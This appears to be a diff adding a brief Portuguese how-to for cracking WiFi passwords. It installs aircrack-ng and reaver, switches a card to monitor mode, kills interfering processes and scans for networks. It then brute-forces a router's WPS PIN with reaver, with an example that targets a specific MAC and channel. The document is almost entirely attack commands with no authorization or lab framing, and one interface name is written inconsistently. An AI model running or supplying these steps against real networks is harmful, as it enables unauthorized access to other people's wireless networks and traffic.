@@ -1,0 +1,32 @@
+-- Antes de tudo, instalar as seguintes ferramentas:
+$ sudo apt-get install aircrack-ng
+$ sudo apt-get install reaver
+
+-- Entre no modo sudo:
+$ sudo su
+
+-- verifique as interfaces WiFi disponiveis:
+# iwconfig
+
+foi achada a interface: wlp6s0
+
+-- inicie uma interface de monitoramento com o dispositivo:
+# airmon-ng start wlp6s0
+
+-- verifique se a interface foi criada:
+# iwconfig
+
+nesse caso foi criada a interface: wlp6s0monS
+
+-- antes de iniciar o monitoramento é desejável terminar alguns processos:
+# airmon-ng check kill
+
+inicie o monitoramento
+# airodump-ng wlp6s0mon
+
+-- para descobrir a senha (demorado):
+# reaver -i "interface criada" -b "end. mac do roteador" -c "canal de uso" -vv
+
+ex (CH4):
+# reaver -i wlp6s0mon -b D8:0D:17:45:F1:32 -c 4 -vv
+
